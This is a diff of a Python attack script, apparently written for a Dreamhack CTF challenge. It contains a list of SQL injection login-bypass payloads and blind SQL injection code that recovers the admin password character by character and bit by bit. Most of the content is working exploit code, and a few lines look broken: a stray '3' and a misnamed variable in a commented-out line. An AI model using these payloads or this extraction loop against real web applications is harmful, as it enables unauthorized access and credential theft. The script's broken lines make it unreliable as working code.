@@ -3,7 +3,7 @@ import re
 import string, json
 
 host = 'http://host3.dreamhack.games'
-port = '8402'
+port = '19472'
 url = host+':'+port
 headers = {'Content-Type': 'application/json; charset=utf-8'}
 cookies = {
@@ -14,6 +14,7 @@ data = {'cmd': 'ls'
         }
 payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
               'admin\' OR 1 -- -',              # admin' OR 1 -- -
+              'admin\' || \'1',                 # and는 &&, or는 ||로 우회
               '" OR "" = "',                    # " OR "" = "
               '" OR 1 = 1 -- -',                # " OR 1 = 1 -- -
               '\'=\'',                          # '='
@@ -78,17 +79,29 @@ for index in range(50):
     if len(existDetector(response.text))>0:
         pwLength = index
         break
-
+countPw = []
+binaryPw = []
 for nthPw in range(1, pwLength+1):
-    for index in range(128):
-        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(index)+';--'
+    for nthBit in range(128):
+        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(nthBit)+';--'
         params = {'uid': payload}
         response = requests.get(url, params = params, verify=False)
-        #printLog('nthPw: '+str(nthPw)+', index: '+str(index), refineResponse(response.text))
+        #printLog('nthPw: '+str(nthPw)+', nthBit: '+str(nthbit), refineResponse(response.text))
         if len(existDetector(response.text))>0:
-            print(str(nthPw)+'th password: '+str(index))
+            bitarray = []
+            print(str(nthPw)+'th password: '+str(nthBit))
+            for bit in range(1, nthBit+1):
+                payload = 'admin\' and substr(bin(ord(substr(upw, '+str(nthPw)+', 1))), '+str(bit)+', 1)=0;--'
+                params = {'uid': payload}
+                response = requests.get(url, params = params, verify=False)
+                if len(existDetector(response.text))>0:
+                    bitarray += '0'
+                else:
+                    bitarray += '1'
+                print(bitarray)
+            binaryPw += bitarray
             break
-
+3
 ################################ PALETTE ################################
 
 # response = requests.get(url, params = params, cookies=cookies, verify=False)
